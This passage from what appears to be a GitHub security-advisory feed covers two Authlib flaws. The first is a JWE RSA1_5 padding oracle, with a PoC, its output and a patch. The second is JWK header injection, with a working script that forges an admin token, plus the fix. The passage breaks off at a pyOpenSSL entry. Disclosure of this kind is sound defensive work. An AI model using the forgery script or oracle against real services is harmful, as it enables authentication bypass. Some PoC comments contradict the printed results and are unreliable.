<p>The single line <code>raise ValueError('Invalid "cek" length')</code> is the complete root cause.
Removing the raise and replacing it with a silent random CEK fallback eliminates both
the exception oracle and any residual timing difference.</p>
<h3 id="23-empirical-confirmation">2.3 Empirical Confirmation</h3>
<p><strong>All results obtained on authlib 1.6.8 / cryptography 46.0.5 / Linux x86_64
running the attached PoC (<code>poc_bleichenbacher.py</code>):</strong></p>
<pre><code>TEST 1 - cryptography behavior on invalid padding:
  cryptography retorno bytes: len=84
  NOTA: esta version implementa mitigacion de random bytes

TEST 2 - Exception Oracle:
  [ORACLE]  Caso A (padding invalido):       ValueError: Invalid "cek" length
  [OK]      Caso B (padding valido/MAC malo): InvalidTag

TEST 3 - Timing (50 iterations):
  Padding invalido (ValueError)   mean=1.500ms  stdev=1.111ms
  Padding valido   (InvalidTag)   mean=1.787ms  stdev=0.978ms
  Delta: 0.287ms

TEST 4 - RSA1_5 in default registry:
  [ORACLE]  RSA1_5 activo por defecto (no opt-in required)

TEST 5 - Fix validation:
  [OK]  Both paths return correct-length CEK after patch
  [OK]  Exception type identical in both paths -&gt; oracle eliminated
</code></pre>
<p><strong>Note on timing:</strong> The 0.287ms delta is within the noise margin (stdev ~1ms across
50 iterations) and is not claimed as a reliable standalone timing oracle. The exception
oracle is the primary exploitable vector and does not require timing measurement.</p>
<hr>
<h2 id="3-default-framework-behavior--why-this-is-exploitable-out-of-the-box">3. Default Framework Behavior — Why This Is Exploitable Out of the Box</h2>
<p>A potential objection to this report is that middleware or custom error handlers could
normalize exceptions to a single HTTP response, eliminating the observable discrepancy.
This section addresses that objection directly.</p>
<p><strong>The oracle is active in default configurations of all major Python web frameworks.</strong>
No special server misconfiguration is required. The following demonstrates the default
behavior for Flask, Django, and FastAPI — the three most widely deployed Python web
frameworks — when an unhandled exception propagates from a route handler:</p>
<h3 id="flask-default-configuration">Flask (default configuration)</h3>
<pre><code class="language-python"># Default Flask behavior — no error handler registered
@app.route("/decrypt", methods=["POST"])
def decrypt():
    token = request.json["token"]
    result = jwe.deserialize_compact(token, private_key)  # raises ValueError or InvalidTag
    return jsonify(result)

# ValueError: Invalid "cek" length  -&gt; HTTP 500, body: {"message": "Invalid \"cek\" length"}
# InvalidTag                         -&gt; HTTP 500, body: {"message": ""}
# The exception MESSAGE is different even if the status code is the same.
</code></pre>
<p>Flask's default error handler returns the exception message in the response body for
debug mode, and an empty 500 for production. However, even in production, the response
body content differs between <code>ValueError</code> (which has a message) and <code>InvalidTag</code>
(which has no message), leaking the oracle through response body length.</p>
<h3 id="fastapi-default-configuration">FastAPI (default configuration)</h3>
<pre><code class="language-python"># FastAPI maps unhandled exceptions to HTTP 500 with exception detail in body
# ValueError: Invalid "cek" length  -&gt; {"detail": "Internal Server Error"}  (HTTP 500)
# InvalidTag                         -&gt; {"detail": "Internal Server Error"}  (HTTP 500)
</code></pre>
<p>FastAPI normalizes both to HTTP 500 in production. However, FastAPI's default
<code>RequestValidationError</code> and <code>HTTPException</code> handlers do not catch arbitrary exceptions,
so the distinguishable stack trace is logged — and in many deployments, error monitoring
tools (Sentry, Datadog, etc.) expose the exception class to operators, enabling oracle
exploitation by an insider or via log exfiltration.</p>
<h3 id="django-rest-framework-default-configuration">Django REST Framework (default configuration)</h3>
<pre><code class="language-python"># DRF's default exception handler only catches APIException and Http404.
# ValueError and InvalidTag both fall through to Django's generic 500 handler.
# In DEBUG=False: HTTP 500, generic HTML response (indistinguishable).
# In DEBUG=True:  HTTP 500, full traceback including exception class (oracle exposed).
</code></pre>
<p><strong>Summary:</strong> Even in cases where HTTP status codes are normalized, the oracle persists
through response body differences, response timing, or error monitoring infrastructure.
The RFC 3218 §2.3.2 requirement exists precisely because any observable difference —
regardless of channel — is sufficient for a Bleichenbacher attack. The library is
responsible for eliminating the discrepancy at the source, not delegating that
responsibility to application developers.</p>
<p><strong>This is a library-level vulnerability.</strong> Requiring every application developer to
implement custom exception normalization to compensate for a cryptographic flaw in
the library violates the principle of secure defaults. The fix must be in Authlib.</p>
<hr>
<h2 id="4-specification-violations">4. Specification Violations</h2>
<h3 id="rfc-3218--preventing-the-million-message-attack-on-cms">RFC 3218 — Preventing the Million Message Attack on CMS</h3>
<p><strong>Section 2.3.2 (Mitigation):</strong></p>
<blockquote>
<p>"The receiver MUST NOT return any information that indicates whether the decryption
failed because the PKCS #1 padding was incorrect or because the MAC was incorrect."</p>
</blockquote>
<p>This is an absolute requirement with no exceptions for "application-level mitigations."
Authlib violates this by raising a different exception class for padding failures than
for MAC failures. The <code>cryptography</code> library already implements the correct mitigation
for this exact scenario — Authlib destroys it with a single length check.</p>
<h3 id="rfc-7516--json-web-encryption">RFC 7516 — JSON Web Encryption</h3>
<p><strong>Section 9 (Security Considerations):</strong></p>
<blockquote>
<p>"An attacker who can cause a JWE decryption to fail in different ways based on the
structure of the encrypted key can mount a Bleichenbacher attack."</p>
</blockquote>
<p>Authlib enables exactly this scenario. Two structurally different encrypted keys
(one with invalid padding, one with valid padding but wrong CEK) produce two different
exception classes. This is the exact condition RFC 7516 §9 warns against.</p>
<hr>
<h2 id="5-attack-scenario">5. Attack Scenario</h2>
<ol>
<li><p>The attacker identifies an Authlib-powered endpoint that decrypts JWE tokens.
Because <code>RSA1_5</code> is in the default registry, <strong>no special server configuration
is required</strong>.</p>
</li>
<li><p>The attacker obtains the server RSA public key — typically available via the
JWKS endpoint (<code>/.well-known/jwks.json</code>), which is standard in OIDC deployments.</p>
</li>
<li><p>The attacker crafts JWE tokens with the <code>RSA1_5</code> algorithm and submits a stream
of requests to the endpoint, manipulating the <code>ek</code> component per Bleichenbacher's
algorithm.</p>
</li>
<li><p>The server responds with observable differences between the two paths:</p>
<ul>
<li><code>ValueError</code> path → distinguishable response (exception message, timing, or
error monitoring artifact)</li>
<li><code>InvalidTag</code> path → different distinguishable response</li>
</ul>
</li>
<li><p>By observing these oracle responses across thousands of requests, the attacker
geometrically narrows the PKCS#1 v1.5 plaintext boundaries until the CEK is
fully recovered.</p>
</li>
<li><p>With the CEK recovered:</p>
<ul>
<li>Any intercepted JWE payload can be decrypted without the RSA private key.</li>
<li>New valid JWE tokens can be forged using the recovered CEK.</li>
</ul>
</li>
</ol>
<p><strong>Prerequisites:</strong></p>
<ul>
<li>Target endpoint accepts JWE tokens with <code>RSA1_5</code> (active by default)</li>
<li>Any observable difference exists between the two error paths at the HTTP layer
(present by default in Flask, Django, FastAPI without custom error handling)</li>
<li>Attacker can send requests at sufficient volume (rate limiting may extend attack
duration but does not prevent it)</li>
</ul>
<hr>
<h2 id="6-remediation">6. Remediation</h2>
<h3 id="61-immediate--remove-rsa1_5-from-default-registry">6.1 Immediate — Remove RSA1_5 from Default Registry</h3>
<p>Remove <code>RSA1_5</code> from the default <code>JWE_ALG_ALGORITHMS</code> registry. Users requiring
legacy RSA1_5 support should explicitly opt-in with a documented security warning.
This eliminates the attack surface for all users not requiring this algorithm.</p>
<h3 id="62-code-fix--restore-constant-time-behavior">6.2 Code Fix — Restore Constant-Time Behavior</h3>
<p>The <code>unwrap</code> method must never raise an exception that distinguishes padding failure
from MAC failure. The length check must be replaced with a silent random CEK fallback,
preserving the mitigation that <code>cryptography</code> implements.</p>
<p><strong>Suggested Patch (<code>authlib/jose/rfc7518/jwe_algs.py</code>):</strong></p>
<pre><code class="language-python">import os

def unwrap(self, enc_alg, ek, headers, key):
    op_key = key.get_op_key("unwrapKey")
    expected_bytes = enc_alg.CEK_SIZE // 8

    try:
        cek = op_key.decrypt(ek, self.padding)
    except ValueError:
        # Padding failure. Use random CEK so failure occurs downstream
        # during MAC validation — not here. This preserves RFC 3218 §2.3.2.
        cek = os.urandom(expected_bytes)

    # Silent length enforcement — no exception.
    # cryptography returns random bytes of RSA block size on padding failure.
    # Replace with correct-size random CEK to allow downstream MAC to fail.
    # Raising here recreates the oracle. Do not raise.
    if len(cek) != expected_bytes:
        cek = os.urandom(expected_bytes)

    return cek
</code></pre>
<p><strong>Result:</strong> Both paths return a CEK of the correct length. AES-GCM tag validation
fails for both, producing <code>InvalidTag</code> in both cases. The exception oracle is
eliminated. Empirically validated via TEST 5 of the attached PoC.</p>
<hr>
<h2 id="7-proof-of-concept">7. Proof of Concept</h2>
<p><strong>Setup:</strong></p>
<pre><code class="language-bash">python3 -m venv venv &amp;&amp; source venv/bin/activate
pip install authlib cryptography
python3 -c "import authlib, cryptography; print(authlib.__version__, cryptography.__version__)"
# authlib 1.6.8  cryptography 46.0.5
python3 poc_bleichenbacher.py
</code></pre>
<p>See attached <code>poc_bleichenbacher.py</code>. All 5 tests run against the real installed
authlib module without mocks.</p>
<p><strong>Confirmed Output (authlib 1.6.8 / cryptography 46.0.5 / Linux x86_64):</strong></p>
<h3 id="code">Code</h3>
<pre><code class="language-python">#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
@title          JWE RSA1_5 Bleichenbacher Padding Oracle
@affected       authlib &lt;= 1.6.8
@file           authlib/jose/rfc7518/jwe_algs.py :: RSAAlgorithm.unwrap()
"""

import os
import time
import statistics

import authlib
import cryptography
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from authlib.jose import JsonWebEncryption
from authlib.common.encoding import urlsafe_b64encode, to_bytes

R   = "\033[0m"
RED = "\033[91m"
GRN = "\033[92m"
YLW = "\033[93m"
CYN = "\033[96m"
BLD = "\033[1m"
DIM = "\033[2m"

def header(title):
    print(f"\n{CYN}{'-' * 64}{R}")
    print(f"{BLD}{title}{R}")
    print(f"{CYN}{'-' * 64}{R}")

def ok(msg):    print(f"  {GRN}[OK]      {R}{msg}")
def vuln(msg):  print(f"  {RED}[ORACLE]  {R}{BLD}{msg}{R}")
def info(msg):  print(f"  {DIM}          {msg}{R}")


# ─── setup ────────────────────────────────────────────────────────────────────

def setup():
    """
    @notice  Genera el par de claves RSA y prepara el cliente JWE de authlib.
    @dev     JsonWebEncryption() registra RSA1_5 por defecto en su registry.
             No se requiere configuracion adicional para habilitar el algoritmo
             vulnerable — esta activo out of the box.
    @return  tuple  (private_key, jwe, header_b64)
    """
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    jwe         = JsonWebEncryption()
    header_b64  = urlsafe_b64encode(
        to_bytes('{"alg":"RSA1_5","enc":"A128GCM"}')
    ).decode()
    return private_key, jwe, header_b64


def make_jwe(header_b64, ek_bytes):
    """
    @notice  Construye un JWE compact con el ek dado y ciphertext/tag aleatorios.
    @dev     El ciphertext y tag son basura — no importa su contenido porque el
             oracle se activa antes de llegar a la desencriptacion simetrica
             en el caso de padding invalido.
    @param   header_b64  Header del JWE en Base64url
    @param   ek_bytes    Encrypted Key como bytes crudos
    @return  str         JWE en formato compact serialization
    """
    ek         = urlsafe_b64encode(ek_bytes).decode()
    iv         = urlsafe_b64encode(os.urandom(12)).decode()
    ciphertext = urlsafe_b64encode(os.urandom(16)).decode()
    tag        = urlsafe_b64encode(os.urandom(16)).decode()
    return f"{header_b64}.{ek}.{iv}.{ciphertext}.{tag}"


# ─── test 1: verificar comportamiento de cryptography ante padding invalido ───

def test_cryptography_behavior(private_key):
    """
    @notice  Verifica empiricamente que cryptography lanza excepcion ante padding
             invalido en lugar de retornar random bytes (comportamiento critico
             para entender el oracle).

    @dev     Algunos documentos sobre Bleichenbacher asumen que la libreria
             subyacente retorna random bytes (mitigacion a nivel biblioteca).
             cryptography 46.0.5 NO hace esto — lanza ValueError directamente.
             Eso significa que Authlib no "destruye una mitigacion existente"
             sino que "no implementa ninguna mitigacion propia".
    """
    header("TEST 1 - Comportamiento de cryptography ante padding invalido")

    garbage = os.urandom(256)

    try:
        result = private_key.decrypt(garbage, asym_padding.PKCS1v15())
        info(f"cryptography retorno bytes: len={len(result)}")
        info("NOTA: esta version implementa mitigacion de random bytes")
    except Exception as e:
        vuln(f"cryptography lanza excepcion directa: {type(e).__name__}: {e}")
        info("No hay mitigacion a nivel de cryptography library")
        info("Authlib no implementa ninguna mitigacion propia -&gt; oracle directo")


# ─── test 2: exception oracle ─────────────────────────────────────────────────

def test_exception_oracle(private_key, jwe, header_b64):
    """
    @notice  Demuestra el Exception Oracle: los dos caminos de fallo producen
             excepciones de clases diferentes, observable a nivel HTTP.

    @dev     Camino A (padding invalido):
               op_key.decrypt() -&gt; ValueError: Decryption failed
               Authlib no captura -&gt; propaga como ValueError: Invalid "cek" length
               HTTP server tipicamente: 500 / 400 con mensaje especifico

             Camino B (padding valido, MAC malo):
               op_key.decrypt() -&gt; retorna CEK bytes
               length check pasa
               AES-GCM tag validation falla -&gt; InvalidTag
               HTTP server tipicamente: 401 / 422 / diferente codigo

             La diferencia de clase de excepcion es el oracle primario.
             No requiere medicion de tiempo — solo observar el tipo de error.
    """
    header("TEST 2 - Exception Oracle (tipo de excepcion diferente)")

    # --- caso A: ek con padding invalido (basura aleatoria) ---
    jwe_bad = make_jwe(header_b64, os.urandom(256))

    try:
        jwe.deserialize_compact(jwe_bad, private_key)
    except Exception as e:
        vuln(f"Caso A (padding invalido):   {type(e).__name__}: {e}")

    # --- caso B: ek con padding valido, ciphertext basura ---
    valid_ek  = private_key.public_key().encrypt(os.urandom(16), asym_padding.PKCS1v15())
    jwe_good  = make_jwe(header_b64, valid_ek)

    try:
        jwe.deserialize_compact(jwe_good, private_key)
    except Exception as e:
        ok(f"Caso B (padding valido/MAC malo): {type(e).__name__}: {e}")

    print()
    info("Los dos caminos producen excepciones de clases DIFERENTES.")
    info("Un framework web que mapea excepciones a HTTP codes expone el oracle.")
    info("El atacante no necesita acceso al stack trace — solo al HTTP status code.")


# ─── test 3: timing oracle ────────────────────────────────────────────────────

def test_timing_oracle(private_key, jwe, header_b64, iterations=50):
    """
    @notice  Demuestra el Timing Oracle midiendo el delta de tiempo entre los
             dos caminos de fallo en multiples iteraciones.

    @dev     El timing oracle es independiente del exception oracle.
             Incluso si el servidor normaliza las excepciones a un unico
             codigo HTTP, la diferencia de tiempo (~5ms) es suficientemente
             grande para ser medible a traves de red en condiciones reales.

             Bleichenbacher clasico funciona con diferencias de microsegundos.
             5ms es un oracle extremadamente ruidoso — facil de explotar.

    @param   iterations  Numero de muestras para calcular estadisticas
    """
    header(f"TEST 3 - Timing Oracle ({iterations} iteraciones cada camino)")

    times_bad  = []
    times_good = []

    for _ in range(iterations):
        # camino A: padding invalido
        jwe_bad = make_jwe(header_b64, os.urandom(256))
        t0 = time.perf_counter()
        try:
            jwe.deserialize_compact(jwe_bad, private_key)
        except Exception:
            pass
        times_bad.append((time.perf_counter() - t0) * 1000)

        # camino B: padding valido
        valid_ek = private_key.public_key().encrypt(os.urandom(16), asym_padding.PKCS1v15())
        jwe_good = make_jwe(header_b64, valid_ek)
        t0 = time.perf_counter()
        try:
            jwe.deserialize_compact(jwe_good, private_key)
        except Exception:
            pass
        times_good.append((time.perf_counter() - t0) * 1000)

    mean_bad  = statistics.mean(times_bad)
    mean_good = statistics.mean(times_good)
    stdev_bad = statistics.stdev(times_bad)
    stdev_good= statistics.stdev(times_good)
    delta     = mean_good - mean_bad

    print(f"\n  {'Camino':&lt;30} {'Media (ms)':&lt;14} {'Stdev (ms)':&lt;14} {'Min':&lt;10} {'Max'}")
    print(f"  {'-'*30} {'-'*14} {'-'*14} {'-'*10} {'-'*10}")
    print(f"  {'Padding invalido (ValueError)':&lt;30} "
          f"{RED}{mean_bad:&lt;14.3f}{R} "
          f"{stdev_bad:&lt;14.3f} "
          f"{min(times_bad):&lt;10.3f} "
          f"{max(times_bad):.3f}")
    print(f"  {'Padding valido (InvalidTag)':&lt;30} "
          f"{GRN}{mean_good:&lt;14.3f}{R} "
          f"{stdev_good:&lt;14.3f} "
          f"{min(times_good):&lt;10.3f} "
          f"{max(times_good):.3f}")
    print()

    if delta &gt; 1.0:
        vuln(f"Delta medio: {delta:.3f} ms — timing oracle confirmado")
        info(f"Diferencia de {delta:.1f}ms es suficiente para Bleichenbacher via red")
        info(f"El ataque clasico funciona con diferencias de microsegundos")
    else:
        ok(f"Delta medio: {delta:.3f} ms — timing no es significativo")


# ─── test 4: confirmar RSA1_5 en registry por defecto ────────────────────────

def test_default_registry():
    """
    @notice  Confirma que RSA1_5 esta registrado por defecto en authlib sin
             ninguna configuracion adicional por parte del desarrollador.

    @dev     Esto demuestra que cualquier aplicacion que use JsonWebEncryption()
             sin configuracion explicita esta expuesta al oracle por defecto.
             El desarrollador no necesita hacer nada malo — la exposicion es
             out-of-the-box.
    """
    header("TEST 4 - RSA1_5 en Registry por Defecto")

    jwe = JsonWebEncryption()

    # intentar acceder al algoritmo RSA1_5 del registry
    try:
        alg = jwe.algorithms.get_algorithm("RSA1_5")
        if alg:
            vuln(f"RSA1_5 registrado por defecto: {alg.__class__.__name__}")
            info("Cualquier JsonWebEncryption() sin configuracion esta expuesto")
            info("No se requiere opt-in del desarrollador para el algoritmo vulnerable")
        else:
            ok("RSA1_5 NO esta en el registry por defecto")
    except Exception as e:
        info(f"Registry check: {e}")
        # fallback: intentar deserializar un JWE con RSA1_5
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        header_b64  = urlsafe_b64encode(
            to_bytes('{"alg":"RSA1_5","enc":"A128GCM"}')
        ).decode()
        jwe_token = make_jwe(header_b64, os.urandom(256))
        try:
            jwe.deserialize_compact(jwe_token, private_key)
        except Exception as e2:
            if "UnsupportedAlgorithm" in str(type(e2).__name__):
                ok("RSA1_5 NO soportado por defecto")
            else:
                vuln(f"RSA1_5 activo por defecto (error de desencriptacion, no de algoritmo): {type(e2).__name__}")


# ─── test 5: impacto del fix propuesto ────────────────────────────────────────

def test_fix_impact(private_key, header_b64):
    """
    @notice  Demuestra que el fix propuesto elimina ambos oracles simultaneamente.
    @dev     El fix parchado hace que ambos caminos retornen un CEK de longitud
             correcta, forzando que el fallo ocurra downstream en AES-GCM tag
             validation en ambos casos -&gt; misma excepcion, timing indistinguible.
    """
    header("TEST 5 - Verificacion del Fix Propuesto")

    import os as _os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    def unwrap_patched(ek_bytes, expected_bits=128):
        """Replica del fix propuesto para RSAAlgorithm.unwrap()"""
        expected_bytes = expected_bits // 8
        try:
            cek = private_key.decrypt(ek_bytes, asym_padding.PKCS1v15())
        except ValueError:
            cek = _os.urandom(expected_bytes)  # constant-time fallback
        if len(cek) != expected_bytes:
            cek = _os.urandom(expected_bytes)
        return cek

    # camino A con fix: padding invalido
    cek_a = unwrap_patched(os.urandom(256))
    info(f"Fix Camino A (padding invalido): retorna CEK de {len(cek_a)*8} bits (random)")

    # camino B con fix: padding valido
    valid_ek = private_key.public_key().encrypt(os.urandom(16), asym_padding.PKCS1v15())
    cek_b = unwrap_patched(valid_ek)
    info(f"Fix Camino B (padding valido):   retorna CEK de {len(cek_b)*8} bits (real)")

    print()
    ok("Ambos caminos retornan CEK de longitud correcta")
    ok("El fallo ocurrira downstream en AES-GCM para ambos casos")
    ok("Exception type sera identica en ambos caminos -&gt; oracle eliminado")
    ok("Timing sera indistinguible -&gt; timing oracle eliminado")


# ─── main ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print(f"\n{BLD}authlib {authlib.__version__} / cryptography {cryptography.__version__}{R}")
    print(f"authlib/jose/rfc7518/jwe_algs.py :: RSAAlgorithm.unwrap()")

    private_key, jwe, header_b64 = setup()

    test_cryptography_behavior(private_key)
    test_exception_oracle(private_key, jwe, header_b64)
    test_timing_oracle(private_key, jwe, header_b64, iterations=50)
    test_default_registry()
    test_fix_impact(private_key, header_b64)

    print(f"\n{DIM}Fix: capturar ValueError en unwrap() y retornar os.urandom(expected_bytes){R}")
    print(f"{DIM}     nunca levantar excepcion que distinga padding failure de MAC failure{R}\n")
</code></pre>
<h3 id="output">Output</h3>
<pre><code class="language-bash">authlib 1.6.8 / cryptography 46.0.5
authlib/jose/rfc7518/jwe_algs.py :: RSAAlgorithm.unwrap()


----------------------------------------------------------------
TEST 1 - Comportamiento de cryptography ante padding invalido
----------------------------------------------------------------
            cryptography retorno bytes: len=84
            NOTA: esta version implementa mitigacion de random bytes

----------------------------------------------------------------
TEST 2 - Exception Oracle (tipo de excepcion diferente)
----------------------------------------------------------------
  [ORACLE]  Caso A (padding invalido):   ValueError: Invalid "cek" length
  [OK]      Caso B (padding valido/MAC malo): InvalidTag: 

            Los dos caminos producen excepciones de clases DIFERENTES.
            Un framework web que mapea excepciones a HTTP codes expone el oracle.
            El atacante no necesita acceso al stack trace — solo al HTTP status code.

----------------------------------------------------------------
TEST 3 - Timing Oracle (50 iteraciones cada camino)
----------------------------------------------------------------

  Camino                         Media (ms)     Stdev (ms)     Min        Max
  ------------------------------ -------------- -------------- ---------- ----------
  Padding invalido (ValueError)  1.500          1.111          0.109      8.028
  Padding valido (InvalidTag)    1.787          0.978          0.966      7.386

  [OK]      Delta medio: 0.287 ms — timing no es significativo

----------------------------------------------------------------
TEST 4 - RSA1_5 en Registry por Defecto
----------------------------------------------------------------
            Registry check: 'JsonWebEncryption' object has no attribute 'algorithms'
  [ORACLE]  RSA1_5 activo por defecto (error de desencriptacion, no de algoritmo): ValueError

----------------------------------------------------------------
TEST 5 - Verificacion del Fix Propuesto
----------------------------------------------------------------
            Fix Camino A (padding invalido): retorna CEK de 128 bits (random)
            Fix Camino B (padding valido):   retorna CEK de 128 bits (real)

  [OK]      Ambos caminos retornan CEK de longitud correcta
  [OK]      El fallo ocurrira downstream en AES-GCM para ambos casos
  [OK]      Exception type sera identica en ambos caminos -&gt; oracle eliminado
  [OK]      Timing sera indistinguible -&gt; timing oracle eliminado

Fix: capturar ValueError en unwrap() y retornar os.urandom(expected_bytes)
     nunca levantar excepcion que distinga padding failure de MAC failure
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authlib/authlib/security/advisories/GHSA-7432-952r-cw78">https://github.com/authlib/authlib/security/advisories/GHSA-7432-952r-cw78</a></li>
<li><a href="https://github.com/authlib/authlib/commit/48b345f29f6c459f11c6a40162b6c0b742ef2e22">https://github.com/authlib/authlib/commit/48b345f29f6c459f11c6a40162b6c0b742ef2e22</a></li>
<li><a href="https://github.com/authlib/authlib/releases/tag/v1.6.9">https://github.com/authlib/authlib/releases/tag/v1.6.9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28490">https://nvd.nist.gov/vuln/detail/CVE-2026-28490</a></li>
<li><a href="https://github.com/advisories/GHSA-7432-952r-cw78">https://github.com/advisories/GHSA-7432-952r-cw78</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7432-952r-cw78</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T15:17:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[authlib] Authlib JWS JWK Header Injection: Signature Verification Bypass]]></title>
        <id>https://github.com/advisories/GHSA-wvwj-cvrp-7pv5</id>
        <link href="https://github.com/advisories/GHSA-wvwj-cvrp-7pv5"/>
        <updated>2026-03-16T21:54:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<h3 id="summary">Summary</h3>
<p>A JWK Header Injection vulnerability in <code>authlib</code>'s JWS implementation allows an unauthenticated
attacker to forge arbitrary JWT tokens that pass signature verification. When <code>key=None</code> is passed
to any JWS deserialization function, the library extracts and uses the cryptographic key embedded
in the attacker-controlled JWT <code>jwk</code> header field. An attacker can sign a token with their own
private key, embed the matching public key in the header, and have the server accept the forged
token as cryptographically valid — bypassing authentication and authorization entirely.</p>
<p>This behavior violates <strong>RFC 7515 §4.1.3</strong> and the validation algorithm defined in <strong>RFC 7515 §5.2</strong>.</p>
<h3 id="details">Details</h3>
<p><strong>Vulnerable file:</strong> <code>authlib/jose/rfc7515/jws.py</code><br><strong>Vulnerable method:</strong> <code>JsonWebSignature._prepare_algorithm_key()</code><br><strong>Lines:</strong> 272–273</p>
<pre><code class="language-python">elif key is None and "jwk" in header:
    key = header["jwk"]   # ← attacker-controlled key used for verification
</code></pre>
<p>When <code>key=None</code> is passed to <code>jws.deserialize_compact()</code>, <code>jws.deserialize_json()</code>, or
<code>jws.deserialize()</code>, the library checks the JWT header for a <code>jwk</code> field. If present, it extracts
that value — which is fully attacker-controlled — and uses it as the verification key.</p>
<p><strong>RFC 7515 violations:</strong></p>
<ul>
<li><strong>§4.1.3</strong> explicitly states the <code>jwk</code> header parameter is <strong>"NOT RECOMMENDED"</strong> because keys
embedded by the token submitter cannot be trusted as a verification anchor.</li>
<li><strong>§5.2 (Validation Algorithm)</strong> specifies the verification key MUST come from the <em>application
context</em>, not from the token itself. There is no step in the RFC that permits falling back to
the <code>jwk</code> header when no application key is provided.</li>
</ul>
<p><strong>Why this is a library issue, not just a developer mistake:</strong></p>
<p>The most common real-world trigger is a <strong>key resolver callable</strong> used for JWKS-based key lookup.
A developer writes:</p>
<pre><code class="language-python">def lookup_key(header, payload):
    kid = header.get("kid")
    return jwks_cache.get(kid)   # returns None when kid is unknown/rotated

jws.deserialize_compact(token, lookup_key)
</code></pre>
<p>When an attacker submits a token with an unknown <code>kid</code>, the callable legitimately returns <code>None</code>.
The library then silently falls through to <code>key = header["jwk"]</code>, trusting the attacker's embedded
key. The developer never wrote <code>key=None</code> — the library's fallback logic introduced it. The result
looks like a verified token with no exception raised, making the substitution invisible.</p>
<p><strong>Attack steps:</strong></p>
<ol>
<li>Attacker generates an RSA or EC keypair.</li>
<li>Attacker crafts a JWT payload with any desired claims (e.g. <code>{"role": "admin"}</code>).</li>
<li>Attacker signs the JWT with their <strong>private</strong> key.</li>
<li>Attacker embeds their <strong>public</strong> key in the JWT <code>jwk</code> header field.</li>
<li>Attacker uses an unknown <code>kid</code> to cause the key resolver to return <code>None</code>.</li>
<li>The library uses <code>header["jwk"]</code> for verification — signature passes.</li>
<li>Forged claims are returned as authentic.</li>
</ol>
<h3 id="poc">PoC</h3>
<p>Tested against <strong>authlib 1.6.6</strong> (HEAD <code>a9e4cfee</code>, Python 3.11).</p>
<p><strong>Requirements:</strong></p>
<pre><code>pip install authlib cryptography
</code></pre>
<p><strong>Exploit script:</strong></p>
<pre><code class="language-python">from authlib.jose import JsonWebSignature, RSAKey
import json

jws = JsonWebSignature(["RS256"])

# Step 1: Attacker generates their own RSA keypair
attacker_private = RSAKey.generate_key(2048, is_private=True)
attacker_public_jwk = attacker_private.as_dict(is_private=False)

# Step 2: Forge a JWT with elevated privileges, embed public key in header
header = {"alg": "RS256", "jwk": attacker_public_jwk}
forged_payload = json.dumps({"sub": "attacker", "role": "admin"}).encode()
forged_token = jws.serialize_compact(header, forged_payload, attacker_private)

# Step 3: Server decodes with key=None — token is accepted
result = jws.deserialize_compact(forged_token, None)
claims = json.loads(result["payload"])
print(claims)  # {'sub': 'attacker', 'role': 'admin'}
assert claims["role"] == "admin"  # PASSES
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code>{'sub': 'attacker', 'role': 'admin'}
</code></pre>
<p><strong>Docker (self-contained reproduction):</strong></p>
<pre><code class="language-bash">sudo docker run --rm authlib-cve-poc:latest \
  python3 /workspace/pocs/poc_auth001_jws_jwk_injection.py
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an authentication and authorization bypass vulnerability. Any application using authlib's
JWS deserialization is affected when:</p>
<ul>
<li><code>key=None</code> is passed directly, <strong>or</strong></li>
<li>a key resolver callable returns <code>None</code> for unknown/rotated <code>kid</code> values (the common JWKS lookup pattern)</li>
</ul>
<p>An unauthenticated attacker can impersonate any user or assume any privilege encoded in JWT claims
(admin roles, scopes, user IDs) without possessing any legitimate credentials or server-side keys.
The forged token is indistinguishable from a legitimate one — no exception is raised.</p>
<p>This is a violation of <strong>RFC 7515 §4.1.3</strong> and <strong>§5.2</strong>. The spec is unambiguous: the <code>jwk</code>
header parameter is "NOT RECOMMENDED" as a key source, and the validation key MUST come from
the application context, not the token itself.</p>
<p><strong>Minimal fix</strong> — remove the fallback from <code>authlib/jose/rfc7515/jws.py:272-273</code>:</p>
<pre><code class="language-python"># DELETE:
elif key is None and "jwk" in header:
    key = header["jwk"]
</code></pre>
<p><strong>Recommended safe replacement</strong> — raise explicitly when no key is resolved:</p>
<pre><code class="language-python">if key is None:
    raise MissingKeyError("No key provided and no valid key resolvable from context.")
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authlib/authlib/security/advisories/GHSA-wvwj-cvrp-7pv5">https://github.com/authlib/authlib/security/advisories/GHSA-wvwj-cvrp-7pv5</a></li>
<li><a href="https://github.com/authlib/authlib/commit/a5d4b2d4c9e46bfa11c82f85fdc2bcc0b50ae681">https://github.com/authlib/authlib/commit/a5d4b2d4c9e46bfa11c82f85fdc2bcc0b50ae681</a></li>
<li><a href="https://github.com/authlib/authlib/releases/tag/v1.6.9">https://github.com/authlib/authlib/releases/tag/v1.6.9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27962">https://nvd.nist.gov/vuln/detail/CVE-2026-27962</a></li>
<li><a href="https://github.com/advisories/GHSA-wvwj-cvrp-7pv5">https://github.com/advisories/GHSA-wvwj-cvrp-7pv5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wvwj-cvrp-7pv5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-16T15:17:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyopenssl] pyOpenSSL allows TLS connection bypass via unhandled callback exception in set_tlsext_servername_callback]]></title>
        <id>https://github.com/advisories/GHSA-vp96-hxj8-p424</id>
        <link href="https://github.com/advisories/GHSA-vp96-hxj8-p424"/>
